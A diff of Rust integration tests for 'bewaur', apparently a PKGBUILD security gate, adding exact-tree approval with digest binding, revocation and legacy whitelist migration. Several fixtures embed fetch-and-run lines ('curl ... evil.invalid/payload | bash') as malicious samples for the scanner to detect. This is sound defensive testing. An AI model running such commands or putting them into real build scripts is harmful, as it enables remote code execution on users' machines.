@@ -45,17 +45,47 @@ impl TestTree {
         fs::write(config_dir.join("config.toml"), content).unwrap();
     }
 
-    fn command(&self) -> Command {
+    fn isolated_command(&self) -> Command {
         let mut command = Command::new(env!("CARGO_BIN_EXE_bewaur"));
         command
-            .args(["gate", "--build-dir"])
-            .arg(&self.build_dir)
             .env("HOME", self.root.join("home"))
             .env("XDG_CONFIG_HOME", self.root.join("config"))
             .env("XDG_CACHE_HOME", self.root.join("cache"))
             .env_remove("SUDO_USER")
             .env_remove("DOAS_USER");
         command
+    }
+
+    fn command(&self) -> Command {
+        let mut command = self.isolated_command();
+        command.args(["gate", "--build-dir"]).arg(&self.build_dir);
+        command
+    }
+
+    fn approve_command(&self) -> Command {
+        let review = self.approval_review();
+        assert!(!review.status.success(), "{}", stderr(&review));
+        let review_stderr = stderr(&review);
+        let digest = review_stderr
+            .lines()
+            .find_map(|line| {
+                line.strip_prefix("bewaur approve: reviewed local source-tree digest ")
+            })
+            .unwrap_or_else(|| panic!("approval review did not print a digest: {review_stderr}"));
+
+        let mut command = self.isolated_command();
+        command
+            .args(["approve", "--reviewed", digest, "--build-dir"])
+            .arg(&self.build_dir);
+        command
+    }
+
+    fn approval_review(&self) -> Output {
+        self.isolated_command()
+            .args(["approve", "--build-dir"])
+            .arg(&self.build_dir)
+            .output()
+            .expect("failed to execute bewaur approval review")
     }
 }
 
@@ -72,6 +102,23 @@ fn write_package(tree: &TestTree, pkgbase: &str, package_names: &[&str], pkgbuil
         srcinfo.push_str(&format!("\npkgname = {package_name}\n"));
     }
     tree.write_build_file(".SRCINFO", &srcinfo);
+}
+
+fn write_approval_fixture(tree: &TestTree) {
+    tree.write_build_file(
+        "PKGBUILD",
+        "pkgbase=gate-approval\npkgname=gate-approval\npkgver=1\npkgrel=1\nsource=('helper.sh' 'README')\ninstall=gate-approval.install\nprepare() { curl -s https://evil.invalid/payload | bash; }\npackage() { :; }\n",
+    );
+    tree.write_build_file(
+        ".SRCINFO",
+        "pkgbase = gate-approval\n\tsource = helper.sh\n\tsource = README\n\npkgname = gate-approval\n\tinstall = gate-approval.install\n",
+    );
+    tree.write_build_file(
+        "gate-approval.install",
+        "post_install() { echo installed; }\n",
+    );
+    tree.write_build_file("helper.sh", "#!/bin/sh\necho helper\n");
+    tree.write_build_file("README", "reviewed build input\n");
 }
 
 fn run_with_pkgbase(tree: &TestTree, pkgbase: &str) -> Output {
@@ -553,15 +600,15 @@ fn gate_does_not_execute_inert_patch_or_readme_examples_as_shell() {
 }
 
 #[test]
-fn gate_does_not_allow_one_whitelisted_split_package_to_exempt_its_siblings() {
-    let tree = TestTree::new("split-whitelist");
+fn gate_does_not_allow_one_permanent_split_package_to_exempt_its_siblings() {
+    let tree = TestTree::new("split-permanent-allow");
     write_package(
         &tree,
         "gate-split",
         &["gate-split-cli", "gate-split-docs"],
         "pkgbase=gate-split\npkgname=(gate-split-cli gate-split-docs)\nprepare() { curl -s https://evil.invalid/payload | bash; }\n",
     );
-    tree.write_config("[whitelist]\npackages = [\"gate-split-cli\"]\n");
+    tree.write_config("[permanent_allow]\npackages = [\"gate-split-cli\"]\n");
 
     let output = run_with_pkgbase(&tree, "gate-split");
 
@@ -569,19 +616,19 @@ fn gate_does_not_allow_one_whitelisted_split_package_to_exempt_its_siblings() {
     assert!(!output.status.success());
     let stderr = stderr(&output);
     assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
-    assert!(stderr.contains("bewaur allow gate-split"), "{stderr}");
+    assert!(stderr.contains("bewaur approve --build-dir ."), "{stderr}");
 }
 
 #[test]
-fn gate_honors_an_explicit_package_base_whitelist() {
-    let tree = TestTree::new("pkgbase-whitelist");
+fn gate_honors_an_explicit_permanent_package_base_allowance() {
+    let tree = TestTree::new("pkgbase-permanent-allow");
     write_package(
         &tree,
         "gate-split",
         &["gate-split-cli", "gate-split-docs"],
         "pkgbase=gate-split\npkgname=(gate-split-cli gate-split-docs)\n_install_name=missing.install\ninstall=\"${_install_name}\"\nprepare() { curl -s https://evil.invalid/payload | bash; }\n",
     );
-    tree.write_config("[whitelist]\npackages = [\"gate-split\"]\n");
+    tree.write_config("[permanent_allow]\npackages = [\"gate-split\"]\n");
 
     let output = run_with_pkgbase(&tree, "gate-split");
 
@@ -589,13 +636,306 @@ fn gate_honors_an_explicit_package_base_whitelist() {
     assert!(output.status.success(), "{}", stderr(&output));
     let stderr = stderr(&output);
     assert!(
-        stderr.contains("package base gate-split is whitelisted"),
+        stderr.contains("package base gate-split has a permanent name-wide allowance"),
         "{stderr}"
     );
     assert!(
         !stderr.contains("Trust:"),
-        "whitelisted tree was scanned: {stderr}"
+        "permanently allowed tree was scanned: {stderr}"
     );
+}
+
+#[test]
+fn exact_tree_approval_allows_only_the_fully_loaded_reviewed_inputs() {
+    let tree = TestTree::new("exact-tree-approval");
+    write_approval_fixture(&tree);
+
+    let before = run_with_pkgbase(&tree, "gate-approval");
+    assert!(!before.status.success(), "{}", stderr(&before));
+    assert!(stderr(&before).contains("Trust: MALICIOUS"));
+
+    let approved = tree
+        .approve_command()
+        .output()
+        .expect("failed to execute bewaur approve");
+    assert_stdout_is_empty(&approved);
+    assert!(approved.status.success(), "{}", stderr(&approved));
+    assert!(
+        stderr(&approved).contains("Approved exact build tree: gate-approval"),
+        "{}",
+        stderr(&approved)
+    );
+
+    let unchanged = run_with_pkgbase(&tree, "gate-approval");
+    assert_stdout_is_empty(&unchanged);
+    assert!(unchanged.status.success(), "{}", stderr(&unchanged));
+    assert!(
+        stderr(&unchanged).contains("exact build tree for gate-approval is approved"),
+        "{}",
+        stderr(&unchanged)
+    );
+    assert!(
+        stderr(&unchanged).contains("Trust: MALICIOUS"),
+        "an approval must not suppress the current scan report: {}",
+        stderr(&unchanged)
+    );
+
+    tree.write_build_file(
+        "PKGBUILD",
+        "pkgbase=gate-approval\npkgname=gate-approval\npkgver=2\npkgrel=1\nsource=('helper.sh' 'README')\ninstall=gate-approval.install\nprepare() { curl -s https://evil.invalid/payload | bash; }\npackage() { :; }\n",
+    );
+    let changed = run_with_pkgbase(&tree, "gate-approval");
+    assert_stdout_is_empty(&changed);
+    assert!(!changed.status.success());
+    let changed_stderr = stderr(&changed);
+    assert!(
+        changed_stderr.contains("build inputs for gate-approval changed since approval"),
+        "{changed_stderr}"
+    );
+    assert!(
+        changed_stderr.contains("Trust: MALICIOUS"),
+        "{changed_stderr}"
+    );
+}
+
+#[test]
+fn approve_displays_the_current_scan_but_requires_explicit_confirmation() {
+    let tree = TestTree::new("approval-confirmation");
+    write_approval_fixture(&tree);
+    let output = tree.approval_review();
+
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success());
+    let output_stderr = stderr(&output);
+    assert!(
+        output_stderr.contains("Trust: MALICIOUS"),
+        "{output_stderr}"
+    );
+    assert!(
+        output_stderr.contains("approval was not saved")
+            && output_stderr.contains("--reviewed sha256:v1:p1:"),
+        "{output_stderr}"
+    );
+    assert!(!tree.root.join("config/bewaur/config.toml").exists());
+}
+
+#[test]
+fn approval_save_is_bound_to_the_previously_reviewed_digest() {
+    let tree = TestTree::new("approval-review-binding");
+    write_approval_fixture(&tree);
+
+    let review = tree.approval_review();
+    let review_stderr = stderr(&review);
+    let reviewed_digest = review_stderr
+        .lines()
+        .find_map(|line| line.strip_prefix("bewaur approve: reviewed local source-tree digest "))
+        .unwrap();
+
+    tree.write_build_file("README", "different tree after review\n");
+    let save = tree
+        .isolated_command()
+        .args(["approve", "--reviewed", reviewed_digest, "--build-dir"])
+        .arg(&tree.build_dir)
+        .output()
+        .unwrap();
+
+    assert!(!save.status.success(), "{}", stderr(&save));
+    assert!(
+        stderr(&save).contains("reviewed digest does not match the current build tree"),
+        "{}",
+        stderr(&save)
+    );
+    assert!(!tree.root.join("config/bewaur/config.toml").exists());
+}
+
+#[test]
+fn exact_and_permanent_authorizations_can_be_listed_and_revoked_independently() {
+    let tree = TestTree::new("approval-management");
+    write_approval_fixture(&tree);
+    assert!(tree.approve_command().output().unwrap().status.success());
+
+    let permanent = tree
+        .isolated_command()
+        .args(["allow", "gate-approval", "--forever"])
+        .output()
+        .unwrap();
+    assert!(permanent.status.success(), "{}", stderr(&permanent));
+
+    let listed = tree
+        .isolated_command()
+        .args(["approvals", "gate-approval"])
+        .output()
+        .unwrap();
+    assert!(listed.status.success(), "{}", stderr(&listed));
+    let listing = String::from_utf8(listed.stdout).unwrap();
+    assert!(
+        listing.contains("exact     gate-approval  sha256:v1:p1:"),
+        "{listing}"
+    );
+    assert!(listing.contains("permanent gate-approval"), "{listing}");
+
+    let revoke_exact = tree
+        .isolated_command()
+        .args(["revoke", "gate-approval"])
+        .output()
+        .unwrap();
+    assert!(revoke_exact.status.success(), "{}", stderr(&revoke_exact));
+    let after_exact = tree
+        .isolated_command()
+        .args(["approvals", "gate-approval"])
+        .output()
+        .unwrap();
+    let after_exact_listing = String::from_utf8(after_exact.stdout).unwrap();
+    assert!(
+        !after_exact_listing.contains("exact"),
+        "{after_exact_listing}"
+    );
+    assert!(after_exact_listing.contains("permanent gate-approval"));
+
+    let revoke_permanent = tree
+        .isolated_command()
+        .args(["revoke", "gate-approval", "--forever"])
+        .output()
+        .unwrap();
+    assert!(
+        revoke_permanent.status.success(),
+        "{}",
+        stderr(&revoke_permanent)
+    );
+    let gate = run_with_pkgbase(&tree, "gate-approval");
+    assert!(!gate.status.success(), "{}", stderr(&gate));
+    assert!(stderr(&gate).contains("Trust: MALICIOUS"));
+}
+
+#[test]
+fn exact_tree_approval_covers_srcinfo_install_and_local_helper_bytes() {
+    let mutations = [
+        ("srcinfo", ".SRCINFO", "\n# changed metadata\n"),
+        (
+            "install",
+            "gate-approval.install",
+            "\n# changed install script\n",
+        ),
+        ("helper", "helper.sh", "\n# changed helper\n"),
+        ("inert-source", "README", "changed inert source\n"),
+    ];
+
+    for (name, relative, suffix) in mutations {
+        let tree = TestTree::new(name);
+        write_approval_fixture(&tree);
+        let approved = tree.approve_command().output().unwrap();
+        assert!(approved.status.success(), "{name}: {}", stderr(&approved));
+
+        let path = tree.build_dir.join(relative);
+        let mut content = fs::read_to_string(&path).unwrap();
+        content.push_str(suffix);
+        fs::write(path, content).unwrap();
+
+        let output = run_with_pkgbase(&tree, "gate-approval");
+        assert!(!output.status.success(), "{name}: {}", stderr(&output));
+        assert!(
+            stderr(&output).contains("changed since approval"),
+            "{name}: {}",
+            stderr(&output)
+        );
+    }
+}
+
+#[test]
+fn exact_tree_approval_hashes_invalid_utf8_helpers_without_lossy_collisions() {
+    let tree = TestTree::new("exact-invalid-utf8");
+    write_approval_fixture(&tree);
+    tree.write_build_bytes("helper.sh", b"#!/bin/sh\n# byte: \xff\necho helper\n");
+
+    let approved = tree.approve_command().output().unwrap();
+    assert!(approved.status.success(), "{}", stderr(&approved));
+    let unchanged = run_with_pkgbase(&tree, "gate-approval");
+    assert!(unchanged.status.success(), "{}", stderr(&unchanged));
+
+    // Both bytes decode to the same U+FFFD replacement character for scanner
+    // text, but the approval fingerprint must still distinguish the raw tree.
+    tree.write_build_bytes("helper.sh", b"#!/bin/sh\n# byte: \xfe\necho helper\n");
+    let changed = run_with_pkgbase(&tree, "gate-approval");
+    assert!(!changed.status.success(), "{}", stderr(&changed));
+    assert!(
+        stderr(&changed).contains("changed since approval"),
+        "{}",
+        stderr(&changed)
+    );
+}
+
+#[test]
+fn exact_tree_approval_never_bypasses_missing_declared_inputs() {
+    let tree = TestTree::new("approval-missing-input");
+    tree.write_build_file(
+        "PKGBUILD",
+        "pkgname=gate-missing\ninstall=missing.install\npackage() { :; }\n",
+    );
+    tree.write_build_file(
+        ".SRCINFO",
+        "pkgbase = gate-missing\n\npkgname = gate-missing\n\tinstall = missing.install\n",
+    );
+
+    let output = tree.approval_review();
+    assert_stdout_is_empty(&output);
+    assert!(!output.status.success());
+    assert!(
+        stderr(&output).contains("cannot resolve install script"),
+        "{}",
+        stderr(&output)
+    );
+    assert!(!tree.root.join("config/bewaur/config.toml").exists());
+}
+
+#[test]
+fn exact_tree_approval_records_an_optional_helper_that_was_missing() {
+    let tree = TestTree::new("approval-late-helper");
+    write_package(
+        &tree,
+        "gate-late-helper",
+        &["gate-late-helper"],
+        "pkgname=gate-late-helper\nprepare() { ./generated.sh; }\npackage() { :; }\n",
+    );
+
+    let approved = tree.approve_command().output().unwrap();
+    assert!(approved.status.success(), "{}", stderr(&approved));
+    let unchanged = run_with_pkgbase(&tree, "gate-late-helper");
+    assert!(unchanged.status.success(), "{}", stderr(&unchanged));
+
+    tree.write_build_file(
+        "generated.sh",
+        "#!/bin/sh\ncurl https://evil.invalid/payload | bash\n",
+    );
+    let changed = run_with_pkgbase(&tree, "gate-late-helper");
+    assert!(!changed.status.success(), "{}", stderr(&changed));
+    let changed_stderr = stderr(&changed);
+    assert!(
+        changed_stderr.contains("changed since approval"),
+        "{changed_stderr}"
+    );
+    assert!(changed_stderr.contains("P-CURL-PIPE"), "{changed_stderr}");
+}
+
+#[test]
+fn legacy_whitelist_entries_fail_closed_with_an_explicit_migration_error() {
+    let tree = TestTree::new("legacy-whitelist");
+    write_package(
+        &tree,
+        "gate-legacy",
+        &["gate-legacy"],
+        "pkgname=gate-legacy\nprepare() { curl https://evil.invalid/p | bash; }\n",
+    );
+    tree.write_config("[whitelist]\npackages = [\"gate-legacy\"]\n");
+
+    let output = run_with_pkgbase(&tree, "gate-legacy");
+    assert!(!output.status.success());
+    let output_stderr = stderr(&output);
+    assert!(
+        output_stderr.contains("Legacy [whitelist]"),
+        "{output_stderr}"
+    );
+    assert!(output_stderr.contains("--forever"), "{output_stderr}");
+    assert!(!output_stderr.contains("Trust:"), "{output_stderr}");
 }
 
 #[test]
@@ -637,6 +977,22 @@ fn gate_fails_closed_on_malformed_existing_config() {
     assert_stdout_is_empty(&output);
     assert!(!output.status.success());
     assert!(stderr(&output).contains("Failed to parse config"));
+}
+
+#[test]
+fn approve_refuses_to_overwrite_a_malformed_existing_config() {
+    let tree = TestTree::new("approve-bad-config");
+    write_package(&tree, "demo", &["demo"], "pkgname=demo\npackage() { :; }\n");
+    let malformed = "this is not valid TOML = [";
+    tree.write_config(malformed);
+
+    let output = tree.approval_review();
+    assert!(!output.status.success());
+    assert!(stderr(&output).contains("Failed to parse config"));
+    assert_eq!(
+        fs::read_to_string(tree.root.join("config/bewaur/config.toml")).unwrap(),
+        malformed
+    );
 }
 
 #[test]
